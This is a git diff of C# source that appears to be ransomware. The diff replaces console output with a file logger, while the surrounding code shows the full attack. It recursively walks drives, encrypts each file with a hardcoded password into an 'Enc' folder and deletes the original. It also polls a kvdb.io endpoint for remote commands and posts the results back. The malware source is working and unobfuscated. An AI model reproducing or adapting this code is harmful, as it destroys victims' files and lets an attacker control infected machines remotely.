@@ -8,6 +8,13 @@ using System.Net;
 using System.Threading; 
 
 
+public class Output
+{
+	public static void WriteLine(string log)
+	{
+		File.AppendAllText(@"log_enc.txt", DateTime.Now.ToString()+"--"+log + Environment.NewLine);
+	}
+}
 
 class khan_bypass
 {
@@ -26,17 +33,17 @@ class khan_bypass
                     
             foreach (var dir in dirs)
             {
-                Console.WriteLine(dir.Substring(dir.LastIndexOf(Path.DirectorySeparatorChar) + 1).ToString());
+                Output.WriteLine(dir.Substring(dir.LastIndexOf(Path.DirectorySeparatorChar) + 1).ToString());
             }
-            Console.WriteLine(dirs.Count.ToString() +" directories found.");
+            Output.WriteLine(dirs.Count.ToString() +" directories found.");
         }
         catch (UnauthorizedAccessException ex)
         {
-            Console.WriteLine(ex.Message);
+            Output.WriteLine(ex.Message);
         }
         catch (PathTooLongException ex)
         {
-            Console.WriteLine(ex.Message);
+            Output.WriteLine(ex.Message);
         }
 	}
     public void Khan_decrypt(string sourceFilename, string destinationFilename, string password, byte[] salt, int iterations)
@@ -111,27 +118,27 @@ public class RecursiveFileSearch
             // Determine whether the directory exists.
 			 if (Directory.Exists("/root/loot/")) 
 			 {
-				 Console.WriteLine("Root exists");
+				 Output.WriteLine("Root exists");
 			 }
 			 else
 			 {
-				 Console.WriteLine("Cant find root");
+				 Output.WriteLine("Cant find root");
 			 }
             if (Directory.Exists(path)) 
             {
-                Console.WriteLine("That path exists already.");
+                Output.WriteLine("That path exists already.");
                 return;
             }
 
            
             DirectoryInfo di = Directory.CreateDirectory(path);
-            Console.WriteLine("The directory was created successfully at {0}.", Directory.GetCreationTime(path));
+            Output.WriteLine("The directory was created successfully at :"+ Directory.GetCreationTime(path));
 
            
         } 
         catch (Exception e) 
         {
-            Console.WriteLine("The process failed: {0}", e.ToString());
+            Output.WriteLine("The process failed: "+ e.ToString());
         } 
         finally {}
 	}
@@ -142,18 +149,18 @@ public class RecursiveFileSearch
 
         foreach (string dr in drives)
         {
-			Console.WriteLine("Drive name : " + dr);
+			Output.WriteLine("Drive name : " + dr);
             System.IO.DriveInfo di = new System.IO.DriveInfo(@path);
 			
            
             if (!di.IsReady)
             {
-                Console.WriteLine("The drive {0} could not be read", di.Name);
+                Output.WriteLine("The drive {0} could not be read " +di.Name);
                 continue;
             }
            
 			System.IO.DirectoryInfo rootDir=new System.IO.DirectoryInfo(@path);
-			Console.WriteLine("Parent root :"+rootDir.ToString());
+			Output.WriteLine("Parent root :"+rootDir.ToString());
             WalkDirectoryTree(rootDir,path);
 			
         }
@@ -162,11 +169,11 @@ public class RecursiveFileSearch
 		
         foreach (string s in log)
         {
-			Console.WriteLine("Files with restricted access:");
-            Console.WriteLine(s);
+			Output.WriteLine("Files with restricted access:");
+            Output.WriteLine(s);
         }
         // Keep the console window open in debug mode.
-        //Console.WriteLine("Press any key");
+        //Output.WriteLine("Press any key");
         //Console.ReadKey();
     }
 
@@ -176,13 +183,13 @@ public class RecursiveFileSearch
         System.IO.DirectoryInfo[] subDirs = null;
 		if (Directory.Exists(@path+"\\Enc\\")) 
             {
-                Console.WriteLine("That path exists already.");
+                Output.WriteLine("That path exists already.");
                 
             }
 		else
 		{
 		DirectoryInfo di = Directory.CreateDirectory(@path+"\\Enc\\");
-		Console.WriteLine("The directory was created successfully at {0}.", Directory.GetCreationTime(@path+"\\Enc\\"));
+		Output.WriteLine("The directory was created successfully at : " + Directory.GetCreationTime(@path+"\\Enc\\"));
         // First, process all the files directly under this folder
 		}
         try
@@ -198,12 +205,12 @@ public class RecursiveFileSearch
 
         catch (System.IO.DirectoryNotFoundException e)
         {
-            Console.WriteLine(e.Message);
+            Output.WriteLine(e.Message);
         }
         
         if (files != null)
         {
-			Console.WriteLine("root is : "+root.ToString());
+			Output.WriteLine("root is : "+root.ToString());
 			
             foreach (System.IO.FileInfo fi in files)
             {
@@ -212,11 +219,11 @@ public class RecursiveFileSearch
 				{
 				if (fi.FullName.StartsWith(path))
 				{
-                Console.WriteLine(fi.FullName);
+                Output.WriteLine(fi.FullName);
 				khan_bypass h = new khan_bypass();
 				string pass = "klsjndvsodvn";
 				string p=fi.FullName.ToString().Replace("\\","-").Replace(":","_");
-				Console.WriteLine(p);
+				Output.WriteLine(p);
 				h.Khan_encrypt(fi.FullName, @path+"\\Enc\\"+p+".en", pass, h.salt, 1000);
 				File.Delete(fi.FullName);    
 				
@@ -224,7 +231,7 @@ public class RecursiveFileSearch
 				}
 				catch(Exception ex)
 				{
-					Console.WriteLine(ex.Message);
+					Output.WriteLine(ex.Message);
 				}
             }
 
@@ -246,7 +253,7 @@ class Driver_Program
 	public string PostRequestJson(string endpoint, string json)
 	{
     		
-			Console.WriteLine("(2) End point is : " +endpoint);
+			Output.WriteLine("(2) End point is : " +endpoint);
     		string jsonResponse = string.Empty;
  
     		using (var client = new WebClient())
@@ -261,7 +268,7 @@ class Driver_Program
             		var uri = new Uri(endpoint);
            		    var response = client.UploadString(uri, "POST", json);
             		jsonResponse = response;
-					Console.WriteLine("DATA written");
+					Output.WriteLine("DATA written");
 					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
        			 }
         	catch (WebException ex)
@@ -270,17 +277,17 @@ class Driver_Program
             		if (ex.Status == WebExceptionStatus.ProtocolError)
             		{
 						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
-						 Console.WriteLine("Error is :" +response);
+						 Output.WriteLine("Error is :" +response);
 						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
 						var statusCode = (int)wrsp.StatusCode;
 						var msg = wrsp.StatusDescription;
-						Console.WriteLine("Exception : " + msg + wrsp.StatusCode);
+						Output.WriteLine("Exception : " + msg + wrsp.StatusCode);
 						return msg;
                		
             		}
             		else
             		{
-                		Console.WriteLine("Exception 11" + ex.Message);
+                		Output.WriteLine("Exception 11" + ex.Message);
 						return ex.Message;
             		}
         		}
@@ -294,7 +301,7 @@ class Driver_Program
 		{
    			 try
     			{
-				Console.WriteLine("(1) End point is : " +endpoint);
+				Output.WriteLine("(1) End point is : " +endpoint);
         		client.BaseAddress = endpoint;
         		client.UseDefaultCredentials = true;
 				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
@@ -309,19 +316,19 @@ class Driver_Program
                		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                 		var statusCode = (int)wrsp.StatusCode;
                 		var msg = wrsp.StatusDescription;
-						Console.WriteLine("Exception : " + msg);
+						Output.WriteLine("Exception : " + msg);
 						return "0";
                			
             		}
             		else
 					{
-                		Console.WriteLine("Exception 11" + ex.Message);
+                		Output.WriteLine("Exception 11" + ex.Message);
 						return "0";
             		}
 				}
 			catch(Exception ex)
 			{
-				Console.WriteLine("Genera; Exception " + ex.Message);
+				Output.WriteLine("Genera; Exception " + ex.Message);
 				return "0";
 			}
 	}
@@ -353,7 +360,7 @@ class Driver_Program
 					string type=command_details[1];
 					if(command_type.Equals("exfil"))
 					{
-						Console.WriteLine("(a) Path is : " +command_details[2]);
+						Output.WriteLine("(a) Path is : " +command_details[2]);
 						
 						 if (type.Equals("path"))
 						{
@@ -362,32 +369,32 @@ class Driver_Program
 							{
 								new_command=command_details[0]+","+command_details[1]+","+command_details[2]+","+"0";
 								var res1=obj.PostRequestJson(updated_ep,new_command);
-								Console.WriteLine("Updated Resp : " +res1);
+								Output.WriteLine("Updated Resp : " +res1);
 								RecursiveFileSearch.Start(command_details[2]);
 								string updated_epp="https://kvdb.io/"+res_key+"/file_encrypt_results";
 								var r=obj.PostRequestJson(updated_epp,new_command+",Executed Successfully");
 							}
 							else
 							{
-								Console.WriteLine("(2) Pass no new command");
+								Output.WriteLine("(2) Pass no new command");
 							}
 							
 						}
 						else
 						{
-							Console.WriteLine("(b) Invalid path");
+							Output.WriteLine("(b) Invalid path");
 						}
 					}
 				}
 				else
 				{
-					Console.WriteLine("(**) No new command  "+resp2);
+					Output.WriteLine("(**) No new command  "+resp2);
 				}
-				Console.WriteLine("Resp obtained : "+resp2);
+				Output.WriteLine("Resp obtained : "+resp2);
 				}
 				catch(Exception ex)
 				{
-					Console.WriteLine("Exception : " +ex.Message);
+					Output.WriteLine("Exception : " +ex.Message);
 					//sw.Write(ex.Message);
 				}
 				}
